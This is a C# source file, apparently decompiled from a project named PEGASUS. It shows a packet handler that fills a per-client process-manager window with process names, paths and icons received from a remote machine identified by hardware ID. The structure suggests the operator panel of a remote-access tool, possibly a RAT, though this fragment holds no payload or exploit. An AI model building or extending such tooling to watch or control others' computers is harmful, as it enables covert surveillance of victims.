using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using PEGASUS.Connection;
using PEGASUS.Forms;
using PEGASUS.MessagePack;

namespace PEGASUS.Handle_Packet
	{
public class HandleProcessManager
{
	public void GetProcess(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			FormProcessManager formProcessManager = (FormProcessManager)Application.OpenForms["processManager:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			if (formProcessManager == null)
			{
				return;
			}
			if (formProcessManager.Client == null)
			{
				formProcessManager.Client = client;
				formProcessManager.listView1.Enabled = true;
				formProcessManager.timer1.Enabled = true;
			}
			formProcessManager.listView1.Items.Clear();
			formProcessManager.imageList1.Images.Clear();
			string[] array = unpack_msgpack.ForcePathObject("Message").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
			int num;
			for (num = 0; num < array.Length; num++)
			{
				if (array[num].Length > 0)
				{
					ListViewItem listViewItem = new ListViewItem
					{
						Text = Path.GetFileName(array[num])
					};
					listViewItem.SubItems.Add(array[num + 1]);
					listViewItem.ToolTipText = array[num];
					Image image = Image.FromStream(new MemoryStream(Convert.FromBase64String(array[num + 2])));
					formProcessManager.imageList1.Images.Add(array[num + 1], image);
					listViewItem.ImageKey = array[num + 1];
					formProcessManager.listView1.Items.Add(listViewItem);
				}
				num += 2;
			}
		}
		catch
		{
		}
	}
}
}